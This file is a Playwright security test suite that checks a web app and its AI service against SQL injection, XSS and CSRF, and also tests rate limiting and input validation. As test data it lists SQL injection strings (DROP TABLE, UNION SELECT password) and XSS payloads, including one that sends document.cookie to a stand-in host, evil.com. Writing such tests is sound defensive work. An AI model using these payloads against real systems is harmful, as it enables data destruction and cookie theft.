/**
 * Security Test Suite
 * Tests for rate limiting, SQL injection, XSS, and CSRF protection
 */

import { test, expect } from '@playwright/test'

// API base URLs
const WEB_API = '/api'  // Web server (Next.js) - port 3000
const AI_API = 'http://localhost:8000/api/v1'  // AI Service - port 8000

test.describe('Security Tests', () => {
  test.describe('Rate Limiting', () => {
    test('should allow requests under rate limit', async ({ request }) => {
      // Make 10 requests to web server - should all succeed
      const requests = []
      for (let i = 0; i < 10; i++) {
        requests.push(request.get(`${WEB_API}/health`))
      }
      const responses = await Promise.all(requests)
      // All responses should be 200 or 429 (OK or rate limited)
      responses.forEach(response => {
        expect([200, 429].includes(response.status())).toBe(true)
      })
    })

    test('should block requests exceeding rate limit', async ({ page, request }) => {
      // Skip - rate limiting test requires many requests and Redis
      test.skip(true, 'Skip rate limit test - requires extensive requests')
    })
  })

  test.describe('SQL Injection Protection', () => {
    test('should reject SQL injection in project ID', async ({ request }) => {
      const injectionPayloads = [
        "1'; DROP TABLE projects; --",
        "1' OR '1'='1",
        "1; DELETE FROM projects",
        "' UNION SELECT * FROM users --",
        "1' AND 1=1 --",
        "admin'--"
      ]

      for (const payload of injectionPayloads) {
        // Test against AI Service directly
        const response = await request.get(`${AI_API}/projects/${encodeURIComponent(payload)}`)
        // Should NOT return 500 (server error) - security working
        // 400, 401, 403, 404 are all acceptable (safe responses)
        expect([400, 401, 403, 404].includes(response.status())).toBe(true)
      }
    })

    test('should reject SQL injection in task search', async ({ request }) => {
      const injectionPayloads = [
        "'; DROP TABLE project_tasks; --",
        "' OR 1=1 --",
        "1; DELETE FROM project_tasks",
        "' UNION SELECT password FROM users --"
      ]

      for (const payload of injectionPayloads) {
        const response = await request.get(`${AI_API}/tasks?projectId=${encodeURIComponent(payload)}`)
        // Should NOT return 500 (server error) - security working
        expect([400, 401, 403, 404].includes(response.status())).toBe(true)
      }
    })

    test('should reject SQL injection in agent search', async ({ request }) => {
      const injectionPayloads = [
        "'; DROP TABLE agents; --",
        "' OR '1'='1' --",
        "1; DELETE FROM agents"
      ]

      for (const payload of injectionPayloads) {
        const response = await request.get(`${AI_API}/agents?search=${encodeURIComponent(payload)}`)
        // Should NOT return 500 (server error) - security working
        expect([400, 401, 403, 404].includes(response.status())).toBe(true)
      }
    })
  })

  test.describe('XSS Protection', () => {
    test('should sanitize XSS in task title', async ({ request }) => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '"><script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
        '<svg onload=alert("xss")>',
        '\'><script>alert("xss")</script>'
      ]

      for (const payload of xssPayloads) {
        // Try to create a task with XSS payload - test AI Service
        const response = await request.post(`${AI_API}/tasks`, {
          data: {
            projectId: 'test-project-id',
            title: payload,
            orderIndex: 0
          }
        })

        // Should be rejected (400) due to XSS detection
        expect(response.status()).toBe(400)
      }
    })

    test('should sanitize XSS in project description', async ({ request }) => {
      const xssPayloads = [
        '<script>document.cookie</script>',
        '<img src=x onerror=fetch("http://evil.com/steal?cookie="+document.cookie)>',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert("xss")>'
      ]

      for (const payload of xssPayloads) {
        const response = await request.post(`${AI_API}/projects`, {
          data: {
            title: 'Test Project',
            description: payload
          }
        })

        // Should be rejected (400) due to XSS detection
        expect(response.status()).toBe(400)
      }
    })

    test('should set security headers on responses', async ({ request }) => {
      // Test Web server security headers
      const response = await request.get(`${WEB_API}/health`)

      // Check for security headers
      expect(response.headers()['x-content-type-options']).toBe('nosniff')
      expect(response.headers()['x-frame-options']).toMatch(/deny|sameorigin/i)
      expect(response.headers()['x-xss-protection']).toBe('1; mode=block')
      expect(response.headers()['strict-transport-security']).toMatch(/max-age=/i)
    })

    test('should reject XSS in user input forms', async ({ page }) => {
      await page.goto('/')

      // Try to inject XSS in any input field
      const xssPayload = '<script>alert(document.domain)</script>'

      // Find all input fields and try the payload
      const inputs = page.locator('input[type="text"], input[type="search"], textarea')
      const count = await inputs.count()

      for (let i = 0; i < Math.min(count, 5); i++) {
        const input = inputs.nth(i)
        await input.fill(xssPayload)
        await input.press('Enter')

        // Check that the page doesn't execute the script
        const hasAlert = await page.evaluate(() => {
          return typeof (window as any).alertCalled === 'boolean'
        }).catch(() => false)

        expect(hasAlert).toBe(false)
      }
    })
  })

  test.describe('CSRF Protection', () => {
    test('should require CSRF token for state-changing operations', async ({ request }) => {
      // Try to create a project without CSRF token on Web server
      const response = await request.post(`${WEB_API}/projects`, {
        data: {
          title: 'Malicious Project',
          description: 'Created without CSRF'
        },
        headers: {
          'Content-Type': 'application/json'
        }
      })

      // Should require CSRF token (403 Forbidden)
      expect([403, 401].includes(response.status())).toBe(true)
    })

    test('should accept valid CSRF token', async ({ page, request }) => {
      // Navigate to get CSRF token
      await page.goto('/')

      // Get CSRF token from page or cookie
      const csrfToken = await page.evaluate(() => {
        const token = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')
        return token || document.cookie.split('csrf-token=')[1]?.split(';')[0]
      })

      if (csrfToken) {
        // Should accept with valid token
        const response = await request.post(`${WEB_API}/projects`, {
          data: {
            title: 'Valid Project',
            description: 'Created with valid CSRF'
          },
          headers: {
            'X-CSRF-Token': csrfToken,
            'Content-Type': 'application/json'
          }
        })

        // Should not be 403 when token is valid
        expect(response.status()).not.toBe(403)
      }
    })

    test('should reject CSRF token from different origin', async ({ browser }) => {
      const context = await browser.newContext()
      const page = await context.newPage()

      // Navigate to a different origin (simulated)
      await page.goto('about:blank')

      // Try to use a token from different origin
      const response = await page.request.post(`${WEB_API}/projects`, {
        data: {
          title: 'Cross-origin attack',
          description: 'Should be blocked'
        },
        headers: {
          'X-CSRF-Token': 'stolen-token-from-other-origin'
        }
      })

      // Should reject invalid CSRF token
      expect([403, 401].includes(response.status())).toBe(true)

      await context.close()
    })

    test('should use SameSite cookies', async ({ request }) => {
      const response = await request.get(`${WEB_API}/health`)

      // Check Set-Cookie header for SameSite attribute
      const setCookie = response.headers()['set-cookie']

      if (setCookie) {
        expect(setCookie.toLowerCase()).toContain('samesite')
      }
    })
  })

  test.describe('Input Validation', () => {
    test('should reject oversized input', async ({ request }) => {
      const oversizedTitle = 'a'.repeat(10000)

      // Test AI Service with oversized input
      const response = await request.post(`${AI_API}/tasks`, {
        data: {
          projectId: 'test-project',
          title: oversizedTitle,
          orderIndex: 0
        }
      })

      // Should reject oversized input (400) or CSRF might block first (403)
      expect([400, 403].includes(response.status())).toBe(true)
    })

    test('should reject malformed JSON', async ({ request }) => {
      const response = await request.post(`${AI_API}/tasks`, {
        data: '{invalid json'
      })

      // Should return 400 Bad Request
      expect([400, 415].includes(response.status())).toBe(true)
    })
  })
})
